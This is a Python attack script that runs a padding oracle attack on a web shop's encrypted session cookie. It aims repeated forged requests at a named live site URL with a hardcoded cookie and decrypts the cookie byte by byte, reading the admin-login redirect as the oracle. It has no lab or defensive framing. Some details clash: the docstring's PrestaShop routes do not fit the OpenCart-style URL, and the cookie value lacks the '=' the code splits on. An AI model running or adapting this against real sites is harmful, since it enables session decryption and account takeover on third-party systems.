import requests
import urllib.parse
import base64
  
s = requests.Session()
"""
s.proxies = {
    'http': 'localhost:8080',
    'https': 'localhost:8080',
}
#"""
  
# Login as an employee, get your cookie and paste it here along with the URL
URL = "https://www.parashop.tn/index.php?route=account/account"
cookie = "c18d095043bb43a980af65dc385b6cff"
  
# Parse blocks and size
cookie_name, cookie_value = cookie.split("=")
cookie_value = urllib.parse.unquote(cookie_value)
cookie_size = cookie_value[-6:]
cookie_value = cookie_value[:-6]
cookie_value = base64.b64decode(cookie_value)
  
BLOCK_SIZE = 16
  
def test_padding(data):
    """Returns true if the padding is correct, false otherwise.
    One can easily adapt it for customer cookies using:
    index.php?controller=identity
    """
    data = base64.b64encode(data).decode()
    data = urllib.parse.quote(data)
    data = data + cookie_size
    s.cookies[cookie_name] = data
    r = s.get(URL, allow_redirects=False)
    s.cookies.clear()
    return 'AdminLogin' not in r.headers.get('Location', '')
  
def e(msg):
    print(msg)
    exit(1)
  
if not test_padding(cookie_value):
    e("Invalid cookie (1)")
elif test_padding(b"~~~~~"):
    e("Invalid cookie (2)")
  
# Perform the padding oracle attack
  
result = b''
  
for b in range(1, len(cookie_value) // BLOCK_SIZE + 1):
    obtained = []
    current_block   = cookie_value[(b    ) * BLOCK_SIZE:][:BLOCK_SIZE]
    precedent_block = cookie_value[(b - 1) * BLOCK_SIZE:][:BLOCK_SIZE]
  
    for p in range(BLOCK_SIZE):
        nb_obtained = len(obtained)
  
        for i in range(256):
            pad = nb_obtained + 1
              
            prelude = (
                b"\x00" * (BLOCK_SIZE - pad) +
                bytes([i]) +
                bytes([o ^ pad for o in obtained][::-1])
            )
            data = cookie_value + prelude + current_block
  
            if test_padding(data):
                print("Got byte #%d of block #%d: %d" % (p, b, i))
                obtained.append(i ^ pad)
                break
        else:
            e("Unable to decode position %d" % p)
  
    # Compute the contents of the plaintext block
  
    result += bytes([o ^ p for p, o in zip(precedent_block, obtained[::-1])])
    try:
        print("COOKIE: %s" % result.decode())
    except UnicodeDecodeError:
        print("COOKIE: Unable to decode, wait for next block")